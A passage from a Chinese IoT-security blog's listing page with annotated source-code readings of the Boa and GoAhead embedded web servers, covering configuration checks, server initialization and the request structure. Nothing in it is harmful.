VHostRoot and VirtualHost were enabled, and "</span></span><br><span class="line">                <span class="string">"they are mutually exclusive.\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vhost_root &amp;&amp; document_root) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                <span class="string">"Both VHostRoot and DocumentRoot were enabled, and "</span></span><br><span class="line">                <span class="string">"they are mutually exclusive.\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!default_vhost) &#123;</span><br><span class="line">        default_vhost = DEFAULT_VHOST;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_SETRLIMIT</span></span><br><span class="line">    <span class="keyword">if</span> (cgi_rlimit_cpu &lt; <span class="number">0</span>)</span><br><span class="line">        cgi_rlimit_cpu = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cgi_rlimit_data &lt; <span class="number">0</span>)</span><br><span class="line">        cgi_rlimit_data = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cgi_nice &lt; <span class="number">0</span>)</span><br><span class="line">        cgi_nice = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (max_connections &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rl</span>;</span></span><br><span class="line">        <span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* has not been set explicitly */</span></span><br><span class="line">        c = getrlimit(RLIMIT_NOFILE, &amp;rl);</span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            DIE(<span class="string">"getrlimit"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        max_connections = rl.rlim_cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (max_connections &gt; FD_SETSIZE - <span class="number">20</span>)</span><br><span class="line">        max_connections = FD_SETSIZE - <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ka_timeout &lt; <span class="number">0</span>) ka_timeout=<span class="number">0</span>;  <span class="comment">/* not worth a message */</span></span><br><span class="line">    <span class="comment">/* save some time */</span></span><br><span class="line">    default_timeout = (ka_timeout ? ka_timeout : REQUEST_TIMEOUT);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_POLL</span></span><br><span class="line">    default_timeout *= <span class="number">1000</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (default_type == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        DIE(<span class="string">"DefaultType *must* be set!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="select-c：loop"><a href="#select-c：loop" class="headerlink" title="select.c：loop"></a>select.c：loop</h2><h2 id="requests-c：process-requests"><a href="#requests-c：process-requests" class="headerlink" title="requests.c：process_requests"></a>requests.c：process_requests</h2><h2 id="read-c：read-header"><a href="#read-c：read-header" class="headerlink" title="read.c：read_header"></a>read.c：read_header</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/03/17/iot/嵌入式设备web服务器-goahead/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/17/iot/嵌入式设备web服务器-goahead/" class="post-title-link" itemprop="url">嵌入式设备web服务器-goahead</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-17 14:41:13" itemprop="dateCreated datePublished" datetime="2021-03-17T14:41:13+08:00">2021-03-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:04:28" itemprop="dateModified" datetime="2022-02-21T16:04:28+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="version-2-1-8"><a href="#version-2-1-8" class="headerlink" title="version 2.1.8"></a>version 2.1.8</h1><h2 id="initWebs"><a href="#initWebs" class="headerlink" title="initWebs"></a>initWebs</h2><blockquote>
<p>linux/web.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">initWebs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>	*<span class="title">hp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>	<span class="title">intaddr</span>;</span></span><br><span class="line">	<span class="keyword">char</span>			host[<span class="number">128</span>], dir[<span class="number">128</span>], webdir[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">char</span>			*cp;</span><br><span class="line">	<span class="keyword">char_t</span>			wbuf[<span class="number">128</span>];<span class="comment">//辅助作用的缓冲区</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 初始化socket子系统</span></span><br><span class="line">	<span class="comment">// 对 socketList、socketMax、socketHighestFd赋值</span></span><br><span class="line">	socketOpen();</span><br><span class="line"></span><br><span class="line">	<span class="comment">////Initialize the User Management database</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> USER_MANAGEMENT_SUPPORT</span></span><br><span class="line">		umOpen();</span><br><span class="line">		umRestore(T(<span class="string">"umconfig.txt"</span>));</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"open um!\n"</span>);   <span class="comment">//for debug by xie</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *	Define the local Ip address, host name, default home page and the</span></span><br><span class="line"><span class="comment">	 *	root web directory.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (gethostname(host, <span class="keyword">sizeof</span>(host)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		error(E_L, E_LOG, T(<span class="string">"Can't get hostname"</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Debug the hosts is: %s\n"</span>, host);   <span class="comment">//for debug by xie</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((hp = gethostbyname(host)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can't get host address\n"</span>);   <span class="comment">//for debug by xie</span></span><br><span class="line">		error(E_L, E_LOG, T(<span class="string">"Can't get host address"</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="keyword">char</span> *) &amp;intaddr, (<span class="keyword">char</span> *) hp-&gt;h_addr_list[<span class="number">0</span>],</span><br><span class="line">		(<span class="keyword">size_t</span>) hp-&gt;h_length);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 配置web服务器选项</span></span><br><span class="line">	<span class="built_in">sprintf</span>(webdir, <span class="string">"%s"</span>, rootWeb);    <span class="comment">//add by xie 2007-11-19</span></span><br><span class="line">	websSetDefaultDir(webdir);<span class="comment">// 设置web目录</span></span><br><span class="line">	cp = inet_ntoa(intaddr);</span><br><span class="line">	ascToUni(wbuf, cp, min(<span class="built_in">strlen</span>(cp) + <span class="number">1</span>, <span class="keyword">sizeof</span>(wbuf)));<span class="comment">// 编码转换，调用memcpy</span></span><br><span class="line">	websSetIpaddr(wbuf);<span class="comment">// 设置服务器IP，调用strcpy对websIpaddr赋值</span></span><br><span class="line">	ascToUni(wbuf, host, min(<span class="built_in">strlen</span>(host) + <span class="number">1</span>, <span class="keyword">sizeof</span>(wbuf)));<span class="comment">// 设置xxx之前，一般要先编码转换</span></span><br><span class="line">	websSetHost(wbuf);<span class="comment">// 设置主机名，调用strcpy对websHost赋值</span></span><br><span class="line">	websSetDefaultPage(T(<span class="string">"home.asp"</span>));<span class="comment">// 设置默认主页</span></span><br><span class="line">	websSetPassword(password);<span class="comment">//设置密码，调用strcpy对websPassword赋值</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 在指定端口开启web服务，若port关闭，则按顺序往下试，直到retries次</span></span><br><span class="line">	websOpenServer(port, retries);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 指定uri的处理函数，函数是按顺序调用的</span></span><br><span class="line">	<span class="comment">// First create the URL handlers. Note: handlers are called in sorted order</span></span><br><span class="line">	<span class="comment">// with the longest path handler examined first. Here we define the securityhandler, forms handler and the default web page handler.</span></span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">""</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websSecurityHandler,WEBS_HANDLER_FIRST);<span class="comment">// first最先调用</span></span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">"/goform"</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websFormHandler, <span class="number">0</span>);</span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">"/cgi-bin"</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websCgiHandler, <span class="number">0</span>);</span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">""</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websDefaultHandler,WEBS_HANDLER_LAST);<span class="comment">// last最后调用</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Now define two test procedures. Replace these with your application</span></span><br><span class="line">	<span class="comment">//relevant ASP script procedures and form functions.</span></span><br><span class="line">	websAspDefine(T(<span class="string">"aspTest"</span>), aspTest);</span><br><span class="line">	websFormDefine(T(<span class="string">"formTest"</span>), formTest);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Create the Form handlers for the User Management pages</span></span><br><span class="line">	<span class="comment">// /goform/xxx形式uri的函数处理，多次调用websAspDefine(T("yyy"), xxx);</span></span><br><span class="line">	<span class="comment">// 基于asp和form的两种：websAspDefine和websFormDefine、asp简单form稍复杂</span></span><br><span class="line">	<span class="comment">// 用户基于此goahead框架，可自行添加的用户界面</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> USER_MANAGEMENT_SUPPORT</span></span><br><span class="line">		formDefineUserMgmt();</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 默认路径的处理函数</span></span><br><span class="line">	websUrlHandlerDefine(T(<span class="string">"/"</span>), <span class="literal">NULL</span>, <span class="number">0</span>, websHomePageHandler, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="websSecurityHandler"><a href="#websSecurityHandler" class="headerlink" title="websSecurityHandler"></a>websSecurityHandler</h2><blockquote>
<p>security.c</p>
</blockquote>
<h2 id="websRec（结构体"><a href="#websRec（结构体" class="headerlink" title="websRec（结构体"></a>websRec（结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">websRec</span> &#123;</span></span><br><span class="line">	<span class="keyword">ringq_t</span>			header;				<span class="comment">/* Header dynamic string */</span></span><br><span class="line">	<span class="keyword">time_t</span>			since;				<span class="comment">/* Parsed if-modified-since time */</span></span><br><span class="line">	<span class="keyword">sym_fd_t</span>		cgiVars;			<span class="comment">/* CGI standard variables */</span></span><br><span class="line">	<span class="keyword">sym_fd_t</span>		cgiQuery;			<span class="comment">/* CGI decoded query string */</span></span><br><span class="line">	<span class="keyword">time_t</span>			timestamp;			<span class="comment">/* Last transaction with browser */</span></span><br><span class="line">	<span class="keyword">int</span>				timeout;			<span class="comment">/* Timeout handle */</span></span><br><span class="line">	<span class="keyword">char_t</span>			ipaddr[<span class="number">32</span>];			<span class="comment">/* Connecting ipaddress */</span></span><br><span class="line">	<span class="keyword">char_t</span>			type[<span class="number">64</span>];			<span class="comment">/* Mime type */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*dir;				<span class="comment">/* Directory containing the page */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*path;				<span class="comment">/* Path name without query */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*url;				<span class="comment">/* Full request url */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*host;				<span class="comment">/* Requested host */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*lpath;				<span class="comment">/* Cache local path name */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*query;				<span class="comment">/* Request query */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*decodedQuery;		<span class="comment">/* Decoded request query */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*authType;			<span class="comment">/* Authorization type (Basic/DAA) */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*password;			<span class="comment">/* Authorization password */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*userName;			<span class="comment">/* Authorization username */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*cookie;			<span class="comment">/* Cookie string */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*userAgent;			<span class="comment">/* User agent (browser) */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*protocol;			<span class="comment">/* Protocol (normally HTTP) */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*protoVersion;		<span class="comment">/* Protocol version */</span></span><br><span class="line">	<span class="keyword">int</span>				sid;				<span class="comment">/* Socket id (handler) */</span></span><br><span class="line">	<span class="keyword">int</span>				listenSid;			<span class="comment">/* Listen Socket id */</span></span><br><span class="line">	<span class="keyword">int</span>				port;				<span class="comment">/* Request port number */</span></span><br><span class="line">	<span class="keyword">int</span>				state;				<span class="comment">/* Current state */</span></span><br><span class="line">	<span class="keyword">int</span>				flags;				<span class="comment">/* Current flags -- see above */</span></span><br><span class="line">	<span class="keyword">int</span>				code;				<span class="comment">/* Request result code */</span></span><br><span class="line">	<span class="keyword">int</span>				clen;				<span class="comment">/* Content length */</span></span><br><span class="line">	<span class="keyword">int</span>				wid;				<span class="comment">/* Index into webs */</span></span><br><span class="line">	<span class="keyword">char_t</span>			*cgiStdin;			<span class="comment">/* filename for CGI stdin */</span></span><br><span class="line">	<span class="keyword">int</span>				docfd;				<span class="comment">/* Document file descriptor */</span></span><br><span class="line">	<span class="keyword">int</span>				numbytes;			<span class="comment">/* Bytes to transfer to browser */</span></span><br><span class="line">	<span class="keyword">int</span>				written;			<span class="comment">/* Bytes actually transferred */</span></span><br><span class="line">	<span class="keyword">void</span>			(*writeSocket)(struct websRec *wp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DIGEST_ACCESS_SUPPORT</span></span><br><span class="line">    <span class="keyword">char_t</span>			*realm;		<span class="comment">/* usually the same as "host" from websRec */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*nonce;		<span class="comment">/* opaque-to-client string sent by server */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*digest;	<span class="comment">/* digest form of user password */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*uri;		<span class="comment">/* URI found in DAA header */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*opaque;	<span class="comment">/* opaque value passed from server */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*nc;		<span class="comment">/* nonce count */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*cnonce;	<span class="comment">/* check nonce */</span></span><br><span class="line">    <span class="keyword">char_t</span>			*qop;		<span class="comment">/* quality operator */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WEBS_SSL_SUPPORT</span></span><br><span class="line">	websSSL_t		*wsp;		<span class="comment">/* SSL data structure */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; websRec;</span><br><span class="line"><span class="keyword">typedef</span> websRec	*<span class="keyword">webs_t</span>;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">21Guns</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">164</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">71</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">21Guns</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

</body>
</html>
